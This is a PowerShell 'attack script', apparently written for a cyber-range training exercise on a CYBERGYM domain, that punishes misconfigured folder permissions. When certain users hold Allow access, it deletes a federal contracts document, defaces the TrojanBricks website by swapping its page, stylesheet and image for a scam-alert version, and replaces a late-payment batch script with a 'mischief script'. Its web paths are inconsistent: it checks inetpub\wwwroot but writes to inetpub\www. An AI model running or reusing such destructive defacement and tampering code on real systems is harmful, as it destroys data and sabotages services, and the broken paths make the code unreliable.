#Attack Script for access-control

#Folder Locations
$ContractsFolder = "C:\Company Data\Federal Contracts"
$BatchFolder = "C:\Batch"
$WebFolder = "C:\inetpub\wwwroot\TrojanBricks"

#Users and Permissions for Folders
$ContractsUsers = (Get-Acl -Path $ContractsFolder).Access.IdentityReference
$WebUsers = (Get-Acl -Path $WebFolder).Access.IdentityReference
$BatchUsers = (Get-Acl -Path $BatchFolder).Access.IdentityReference

#Check for AwesomeITUser in Federal Contracts Folder
foreach ($User in $ContractsUsers){
    $CheckPermissions = (Get-Acl $ContractsFolder).Access | Where-Object AccessControlType -eq "Allow" `
    | Where-Object IdentityReference -eq $User
    if ($CheckPermissions) {
       if($User -eq "CYBERGYM\AwesomeITUser") {
           #Delete Files in Federal Contracts Folder
           Remove-Item -Path "C:\Company Data\Federal Contracts\Federal Site Contracts.docx" -Confirm:$false
           #Add Cat Pictures
           Copy-Item -Path "C:\Users\Gymboss\Temp\CatsofValhalla\*" -Destination "C:\Company Data\Federal Contracts" -Recurse
       }
    }
}
#Check for Harold Blair in Trojan Bricks Web Folder
foreach ($User in $WebUsers) {
    $CheckPermissions = (Get-Acl $WebFolder).Access | Where-Object AccessControlType -eq "Allow" `
    | Where-Object IdentityReference -eq $User
    if ($CheckPermissions) {
        if ($User -eq "CYBERGYM\hblair") {
            #Replace Trojan Bricks with Defaced Version
            Remove-Item -Path "C:\inetpub\www\TrojanBricks\templates\index.html"
            Copy-Item -Path "C:\Users\Gymboss\Temp\Defaced\index.html" -Destination "C:\inetpub\www\TrojanBricks\templates"

            Remove-Item -Path "C:\inetpub\www\TrojanBricks\static\css\base.css"
            Copy-Item -Path "C:\Users\Gymboss\Temp\Defaced\base.css" -Destination "C:\inetpub\www\TrojanBricks\static\css"

            Remove-Item -Path "C:\inetpub\www\TrojanBricks\static\images\Brick_Background.png"
            Copy-Item -Path "C:\Users\Gymboss\Temp\Defaced\scam_alert.jpg" -Destination "C:\inetpub\www\TrojanBricks\static\images"

        }
    }
}
#Check for Lola Wolfe in Batch Folder
foreach ($User in $BatchUsers){
    $CheckPermissions = (Get-Acl $BatchFolder).Access | Where-Object AccessControlType -eq "Allow" `
    | Where-Object IdentityReference -eq $User
    if ($CheckPermissions) {
        if ($User -eq "CYBERGYM\lwolfe") {
            #Remove and Replace NotifyLatePayments with mischief script
            Remove-Item -Path "C:\Batch\NotifyLatePayments.ps1"
            Copy-Item -Path "C:\Users\Gymboss\Temp\NotifyLatePayments.ps1" -Destination "C:\Batch"
        }
    }
}
